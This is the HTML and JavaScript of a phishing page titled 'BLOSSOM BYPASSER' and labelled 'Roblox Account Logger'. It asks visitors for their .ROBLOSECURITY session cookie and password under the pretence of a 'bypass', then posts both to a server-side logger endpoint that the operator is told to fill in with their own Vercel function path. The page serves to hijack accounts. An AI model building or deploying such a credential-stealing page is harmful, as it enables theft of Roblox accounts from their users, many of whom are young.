<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BLOSSOM BYPASSER</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 flex items-center justify-center min-h-screen p-4">
  <div class="bg-gray-800 shadow-xl rounded-2xl w-full max-w-lg p-8">
    <h1 class="text-3xl font-bold text-center text-purple-500 mb-6">üéÆ Roblox Account Logger</h1>

    <!-- Avatar Preview -->
    <div class="flex justify-center mb-6">
      <img id="avatar" src="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png" alt="Roblox Avatar" class="w-24 h-24 rounded-full border-4 border-purple-500">
    </div>

    <form id="accountForm" class="space-y-4">
      <div>
        <label for="cookie" class="block mb-1 font-semibold text-gray-300">.ROBLOSECURITY Cookie</label>
        <input type="text" id="cookie" name="cookie" class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-purple-500" required>
      </div>

      <div>
        <label for="password" class="block mb-1 font-semibold text-gray-300">Password</label>
        <input type="password" id="password" name="password" class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-purple-500" required>
      </div>

      <button type="BYPASS" class="w-full bg-purple-600 hover:bg-purple-700 transition-colors text-white p-3 rounded-lg font-bold text-lg">Submit</button>
    </form>

    <p id="status" class="mt-4 text-center text-gray-300"></p>
  </div>

  <script>
    const form = document.getElementById('accountForm');
    const status = document.getElementById('status');
    const avatar = document.getElementById('avatar');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      status.textContent = '‚è≥ BYPASSING...';
      status.className = 'mt-4 text-center text-gray-300';

      const cookie = document.getElementById('cookie').value;
      const password = document.getElementById('password').value;

      try {
        const response = await fetch('/api/logger.ts', { // Replace with your Vercel function path
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookie, password })
        });

        const data = await response.json();

        if (data.success) {
          status.textContent = '‚ùå Account Bypassed!';
          status.className = 'mt-4 text-center text-green-500';

          // Update avatar preview using Roblox user ID from webhook response if returned
          // Example: avatar.src = `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=150&height=150&format=png`;
        } else {
          status.textContent = `‚ùå Error: ${data.message}`;
          status.className = 'mt-4 text-center text-red-500';
        }
      } catch (err) {
        console.error(err);
        status.textContent = '‚ùå Server error';
        status.className = 'mt-4 text-center text-red-500';
      }
    });
  </script>
</body>
</html>
